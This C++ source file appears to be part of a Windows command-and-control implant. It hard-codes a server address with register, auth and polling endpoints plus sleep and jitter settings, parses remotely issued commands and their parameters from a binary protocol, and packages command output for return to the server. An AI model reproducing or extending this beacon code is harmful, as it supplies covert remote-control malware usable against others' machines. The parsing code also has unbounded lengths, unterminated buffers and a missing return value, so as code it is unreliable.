#include "apiFunc.hpp"
#include "cJSON.h"
#include <iostream>
#include "common.hpp"
#include "bytes.hpp"


#define FIXED_JSON_SIZE 28
#define BASE_BUFFER_SIZE 256


/*
	TODO
		move AllocAndLoad, CraftOutput delete rest

*/
BOOL AllocateAndLoadNeeded() {
	
	AuthConf			= AllocMemory<AuthConfig>   (sizeof(AuthConfig));
	ServerConf			= AllocMemory<ServerConfig> (sizeof(ServerConfig));
	CommandInfo         = AllocMemory<COMMANDINFO>  (sizeof(COMMANDINFO));
	g_NetworkManager    = AllocMemory<Network>      (sizeof(Network));
	g_Bytes = AllocMemory<bytes>(sizeof(bytes));
	KModules            = AllocMemory<MODULES>      (sizeof(struct MODULES));
	WinApis             = AllocMemory<WINAPIS>      (sizeof(struct WINAPIS));


	// fix all below, dont need

	if (AuthConf == NULL || ServerConf == NULL || g_NetworkManager == NULL || KModules == NULL || WinApis == NULL) {
		return FALSE;
	}

	CommandInfo->commandID = NULL;
	CommandInfo->commandCode = 0;
	CommandInfo->param = NULL;
	CommandInfo->param2 = NULL;

	if (!LoadApis()) {
		return FALSE;
	}


	// TODO
	// create a python builder and let the user choose the configuration details
	// store encrypted somewhere in the compiled binary
	strcpy_s(ServerConf->BaseURL, sizeof(ServerConf->BaseURL), "192.168.1.24");
	strcpy_s(ServerConf->registerEndpoint, sizeof(ServerConf->registerEndpoint), "/api/v1/register");
	strcpy_s(ServerConf->postEndpoint, sizeof(ServerConf->postEndpoint), "/api/v1/auth");
	strcpy_s(ServerConf->getEndpoint, sizeof(ServerConf->getEndpoint), "/api/v1/list");
	ServerConf->UseSSL = 0;
	ServerConf->SleepTime = 15;
	ServerConf->Jitter = 10;
	ServerConf->Port = 80;

}


// Max Length of Parameters, double check this later
#define MAX_PARAM_LENGTH 2048


// Parses the json command info and stores into the command struct 
BOOL ParseCommandJson(PBYTE CommandString) {
	
	/*
			   [Error/Success 4 bytes] 0 = okay, >0 = error or no command
			   [commandID 4 bytes]
			   [CommandCode 4 bytes]
			   [param1 Length 4 bytes]
			   [param1 N bytes]
			   [param2 Length 4 bytes]
			   [param2 N bytes]
	*/

	g_Bytes->index = 0;
	UINT ErrorCodeCheck = g_Bytes->Read4();
	if (ErrorCodeCheck > 0) {
		printf("No Command OR ERROR\n");
		return FALSE;
	}


	CommandInfo->commandID = g_Bytes->Read4();
	CommandInfo->commandCode = g_Bytes->Read4();
	UINT Param1Len = g_Bytes->Read4();
	if (Param1Len <= 0) return TRUE;

	if (Param1Len < MAX_PARAM_LENGTH) {
		CHAR ParamBuffer[MAX_PARAM_LENGTH];

		g_Bytes->ReadBytes((PBYTE)ParamBuffer, Param1Len);

		if (CommandInfo->param != NULL) {
			free(CommandInfo->param);
		}
		CommandInfo->param = _strdup(ParamBuffer);
	}
	else  return FALSE;



	UINT Param2Len = g_Bytes->Read4();
	if (Param2Len <= 0) return TRUE;
	if (Param2Len < MAX_PARAM_LENGTH) {
		CHAR Param2Buffer[MAX_PARAM_LENGTH];

		g_Bytes->ReadBytes((PBYTE)Param2Buffer, Param2Len);

		if (CommandInfo->param2 != NULL) {
			free(CommandInfo->param2);
		}
		CommandInfo->param2 = _strdup(Param2Buffer);
	}
	else return FALSE;

	

	printf("CommandID: %d\nCommandCode %d\nParam 1: %s\nParam 2: %s\n", CommandInfo->commandID, CommandInfo->commandCode, CommandInfo->param, CommandInfo->param2);

	return TRUE;

}


BOOL CraftOutput(UINT CommandID, _Out_ PBYTE* Output, PBYTE InData, int DataSize, _Out_ int *FinalSize) {
	/*
		[CommandID 4 bytes]
		[CommandOut Len 4 bytes]
		[command output N bytes]
	*/
	g_Bytes->index = 0;

	INT totalSize = 4 + 4 + DataSize;

	PBYTE OutData = AllocMemory<BYTE>(totalSize);
	if (OutData == NULL) {
		*Output = NULL;
		*FinalSize = 0;
		return FALSE;
	}
	g_Bytes->Write4(OutData, CommandID);
	g_Bytes->Write4(OutData, DataSize);
	g_Bytes->WriteBytes(OutData, DataSize, InData);

	*Output = OutData;
	*FinalSize = totalSize;
	return TRUE;



}


BOOL CraftOutputJson(PCHAR CommandID, PCHAR outputData, _Out_ PCHAR* JsonOutput) {
	if (!CommandID || !outputData) {
		return FALSE;
	}

	cJSON* c = cJSON_CreateObject();
	if (!c) return FALSE;

	cJSON_AddStringToObject(c, "command_id", CommandID);
	cJSON_AddStringToObject(c, "output", outputData);
	char* tempJson = cJSON_PrintUnformatted(c);
	cJSON_Delete(c);
	if (!tempJson) return FALSE;
	SIZE_T JsonSize = strlen(tempJson) + 1;

	if (*JsonOutput == NULL) {
		*JsonOutput = AllocMemory<CHAR>(JsonSize);
		if (!*JsonOutput) {
			cJSON_free(tempJson);
			return FALSE;
		}
	}

	
	// copy the data
	memcpy(*JsonOutput, tempJson, JsonSize);

	cJSON_free(tempJson); 
	tempJson = NULL;  // Set to NULL after freeing
	return TRUE;
	
}


BOOL ParseCommand(BYTE* data, INT Size) {

	g_Bytes->index = 0;
	g_Bytes->Set(data, Size);

	UINT ErrorCode = g_Bytes->Read4();
	if (ErrorCode > 0) {
		printf("Error Node Commande\n");
		return FALSE;
	}

	CommandInfo->commandID = g_Bytes->Read4();
	printf("Code: %d\n", CommandInfo->commandID);
	CommandInfo->commandCode = g_Bytes->Read4();
	printf("ID: %d\n", CommandInfo->commandCode);

	UINT Param1Length = g_Bytes->Read4();
	PCHAR Str1 = AllocMemory<CHAR>(Param1Length);
	g_Bytes->ReadBytes((BYTE*)Str1, Param1Length);
	CommandInfo->param = _strdup(Str1);
	printf("param 1: %s\n", CommandInfo->param);
	HeapFree(GetProcessHeap(), 0, Str1);

	UINT Param2Len = g_Bytes->Read4();

	PCHAR Str2 = AllocMemory<CHAR>(Param2Len);
	g_Bytes->ReadBytes((BYTE*)Str2, Param2Len);
	CommandInfo->param2 = _strdup(Str2);
	printf("param 2: %s\n", CommandInfo->param2);
	HeapFree(GetProcessHeap(), 0, Str2);

	return TRUE;

}



